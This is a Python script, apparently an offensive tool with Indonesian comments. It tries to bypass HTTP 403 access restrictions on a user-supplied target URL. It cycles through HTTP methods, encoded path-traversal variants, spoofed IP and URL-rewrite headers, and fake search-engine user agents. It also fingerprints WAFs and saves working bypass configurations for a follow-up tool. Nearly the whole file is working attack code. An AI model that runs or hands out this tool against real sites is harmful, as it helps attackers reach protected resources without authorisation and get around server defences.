import requests
import time
import json
import random
import re
from urllib.parse import urljoin
import warnings
warnings.filterwarnings('ignore')

def get_target_url():
    url = input("Masukkan URL target (contoh: https://example.com): ")
    return url.rstrip('/')

# Daftar payload dan teknik bypass yang diperluas
headers_payload = {
    "X-Original-URL": "{path}",
    "X-Rewrite-URL": "{path}",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forward-For": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-HTTP-Host-Override": "127.0.0.1",
    "Forwarded": "for=127.0.0.1;host=127.0.0.1",
    "X-Forwarded-Proto": "http",
    "X-Forwarded-Scheme": "http",
    "X-Forwarded-Port": "80",
    "X-Real-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-ProxyUser-Ip": "127.0.0.1",
    "X-Original-Host": "127.0.0.1",
    "X-Forwarded-Server": "127.0.0.1",
    "X-Backend-Server": "127.0.0.1",
    "X-Via": "1.1 127.0.0.1",
    "X-Forwarded-By": "127.0.0.1",
    "X-Requested-With": "XMLHttpRequest",
    "X-Custom-Header": "custom_value",
    "X-Api-Version": "1.0",
    "Accept-Language": "*",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Access-Control-Request-Method": "GET",
    "Access-Control-Request-Headers": "X-Requested-With",
    "Origin": "null",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# URL path variations
path_variations = [
    "/",
    "//",
    "/./",
    "/*/",
    "%2f/",
    "%2e/",
    "%252f/",
    "/..;/",
    "/.../",
    "..;/",
    "..%2f/",
    "..%00/",
    "..%0d/",
    "..%5c/",
    "..%ff/",
    "%2e%2e%2f",
    ".%2e/",
    "%3b/",
    "%09/",
    "%20/",
    ".json",
    ".css",
    ".html",
    "?",
    "??",
    "???",
    "?testparam",
    "#",
    "#test",
    "%",
    "%20",
    "%09",
    ".php",
    ".json",
    ";/",
]

# Extended User-Agents
user_agents = [
    # ... (previous user agents) ...
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "facebookexternalhit/1.1",
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36"
]

def generate_headers():
    """Generate various combinations of headers for bypass attempts"""
    base_headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    }
    
    # Randomly add some bypass headers
    bypass_headers = dict(random.sample(list(headers_payload.items()), 
                         k=random.randint(1, len(headers_payload))))
    return {**base_headers, **bypass_headers}

def detect_waf(response):
    """Detect if the target is protected by a WAF"""
    waf_signatures = {
        "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
        "AWS WAF": ["x-amzn-RequestId", "x-amz-cf-id"],
        "Akamai": ["akamai"],
        "Imperva": ["incap_ses", "_incapsula_"],
        "F5 BIG-IP": ["BigIP", "F5"],
        "Sucuri": ["sucuri"],
    }
    
    headers_str = str(response.headers).lower()
    detected_wafs = []
    
    for waf, signatures in waf_signatures.items():
        if any(sig.lower() in headers_str for sig in signatures):
            detected_wafs.append(waf)
    
    return detected_wafs

class Bypass403:
    def __init__(self, url):
        self.base_url = url
        self.successful_attempts = []
        self.session = requests.Session()
        
    def try_method_bypass(self):
        """Try different HTTP methods"""
        methods = ['GET', 'POST', 'HEAD', 'TRACE', 'OPTIONS', 'PUT', 'DELETE', 'PATCH', 'PROPFIND']
        
        for method in methods:
            try:
                response = self.session.request(
                    method=method,
                    url=self.base_url,
                    headers=generate_headers(),
                    verify=False,
                    timeout=10
                )
                if response.status_code < 403:
                    self.log_success(f"Method bypass successful using {method}", response)
                    
            except requests.exceptions.RequestException:
                continue

    def try_path_bypass(self):
        """Try different path variations"""
        parsed_path = self.base_url.split('/')[-1]
        
        for variation in path_variations:
            test_url = self.base_url + variation
            try:
                response = self.session.get(
                    url=test_url,
                    headers=generate_headers(),
                    verify=False,
                    timeout=10
                )
                if response.status_code < 403:
                    self.log_success(f"Path bypass successful using {variation}", response)
                    
            except requests.exceptions.RequestException:
                continue

    def try_header_bypass(self):
        """Try different header combinations"""
        for _ in range(20):  # Try 20 different header combinations
            headers = generate_headers()
            try:
                response = self.session.get(
                    url=self.base_url,
                    headers=headers,
                    verify=False,
                    timeout=10
                )
                if response.status_code < 403:
                    self.log_success("Header bypass successful", response, headers)
                    
            except requests.exceptions.RequestException:
                continue

    def log_success(self, message, response, headers=None):
        """Log successful bypass attempts"""
        success = {
            "message": message,
            "url": response.url,
            "status_code": response.status_code,
            "headers_sent": headers or response.request.headers,
            "response_headers": dict(response.headers),
            "waf_detected": detect_waf(response)
        }
        self.successful_attempts.append(success)
        
        # Save to file immediately
        self.save_results()
        
        # Print success message
        print(f"\n[+] {message}")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] URL: {response.url}")
        if success["waf_detected"]:
            print(f"[+] WAF Detected: {', '.join(success['waf_detected'])}")

    def save_results(self):
        """Save successful attempts to a JSON file"""
        if self.successful_attempts:
            # Simpan ke bypass_config.json untuk kompatibilitas dengan canon_403.py
            with open("bypass_config.json", "w") as f:
                # Ambil attempt pertama yang berhasil
                first_success = self.successful_attempts[0]
                config_data = {
                    "url": first_success["url"],
                    "headers": first_success["headers_sent"],
                    "cookies": {},  # Bisa ditambahkan jika diperlukan
                    "server_type": first_success.get("waf_detected", ["Unknown"])[0]
                }
                json.dump(config_data, f, indent=4)
                
            # Simpan semua hasil ke successful_bypasses.json
            with open("successful_bypasses.json", "w") as f:
                json.dump(self.successful_attempts, f, indent=4)

    def run_all_bypasses(self):
        """Run all bypass methods"""
        print("[*] Starting 403 bypass attempts...")
        print(f"[*] Target URL: {self.base_url}")
        
        self.try_method_bypass()
        self.try_path_bypass()
        self.try_header_bypass()
        
        if self.successful_attempts:
            print(f"\n[+] Found {len(self.successful_attempts)} successful bypass methods!")
            print("[+] Results saved to successful_bypasses.json")
        else:
            print("\n[-] No successful bypass methods found")

def main():
    url = get_target_url()
    bypass = Bypass403(url)
    bypass.run_all_bypasses()

if __name__ == "__main__":
    main()
